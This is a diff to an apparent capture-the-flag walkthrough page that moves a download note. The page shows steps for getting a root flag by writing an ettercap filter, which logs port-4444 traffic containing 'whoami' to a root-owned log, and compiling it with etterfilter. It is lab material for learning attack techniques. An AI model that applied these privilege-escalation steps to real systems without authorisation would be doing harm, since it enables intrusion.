@@ -93,6 +93,7 @@
     <b>Follow steps to find root flag</b><br>
     hint: follow these steps on ssh machine not on your local machine<br>
      step 1. copy and save in a whoami.ecf file  <br><br>
+     note: if this payload not work download whoami.ecf file from repo <a href="whoami.ecf">Download</a><br>
      <b> 
    if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {
     log(DATA.data, "/root/ettercap.log");
@@ -101,8 +102,6 @@
 }
     </b><br>
     
-    note: if this payload not work download whoami.ecf file from repo <a href="whoami.ecf">Download</a><br>
-     
  
  step 2. compile source code with etterfilter<br>
   <b>etterfilter whoami.ecf -o whoami.ef</b><br>
